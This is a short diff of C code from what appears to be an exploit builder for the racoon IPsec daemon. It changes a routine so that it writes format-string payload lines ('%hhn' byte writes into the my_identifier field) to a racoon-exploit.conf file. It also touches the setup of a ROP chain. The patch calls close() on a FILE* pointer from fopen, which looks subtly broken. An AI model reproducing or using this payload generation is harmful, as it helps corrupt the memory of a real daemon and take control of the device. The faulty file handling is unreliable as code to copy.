@@ -71,7 +71,11 @@ short fsgetPadding(unsigned char data) {
 
 void fswriteByte(int param, unsigned char data) {
 	lines++;
-	printf("\tmy_identifier user_fqdn \"%%%du%%%d$hhn\";\n", fsgetPadding(data), param);
+	FILE* fd = fopen("racoon-exploit.conf", "a");
+	if(fd != NULL) {
+		fprintf(fd, "\tmy_identifier user_fqdn \"%%%du%%%d$hhn\";\n", fsgetPadding(data), param);
+		close(fd);
+	}
 }
 
 void setP3Data(unsigned int data) {
@@ -328,6 +332,10 @@ void ropLog(char* msg) {
 
 int ropMain(int slide) {
 	dscs = slide;
+	FILE* fd = fopen("racoon-exploit.conf", "a");
+	if(fd != NULL) {
+		close(fd);
+	}
 
 	// This is fucking crazy, we really need to split this up into function
 	//  sized blocks, (ropPtrace, ropSyslog, ropEtc..),  and we need some
